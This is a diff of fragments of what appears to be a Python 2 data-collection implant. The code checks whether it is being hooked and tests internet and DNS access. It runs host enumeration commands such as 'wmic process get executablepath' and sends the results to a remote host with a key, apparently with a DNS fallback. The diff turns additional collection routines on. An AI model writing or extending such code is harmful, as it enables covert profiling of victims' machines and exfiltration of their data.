@@ -164,7 +164,8 @@ def is_hooked(func):
     else:
         # print("hooked")
         return True
-# check whether Internet access is available
+
+# check whether Internet access is available
 def test_network(url, hash):
     try:
         response = urllib2.urlopen(url, timeout=4)
@@ -303,7 +304,7 @@ def commands_3(result, target, key, host, network_avail, dns_avail):
     result = format_helper(commands)
     send_data(result, target, key, host, network_avail, dns_avail)
 def commands_4(result, target, key, host, network_avail, dns_avail):
-    commands = {'wmic product get Name':'PN',
+    commands = {#'wmic product get Name':'PN',      #disabled due to performance issues
                 'wmic process get executablepath':'EX'}
     for c, v in commands.iteritems():
         # print (c)
@@ -437,8 +438,9 @@ try:
     dns_avail = test_dns(target, target_ip)
     #network_avail = True
     #dns_avail = True
-    fl = [commands_1,commands_2,
-          #commands_3,commands_4,    #disabled
+    fl = [commands_0,commands_1,commands_2,
+          #commands_3,  #disabled
+          commands_4,    
           commands_5,commands_6,commands_7,commands_8,commands_9]
     t = []
     for f in fl:
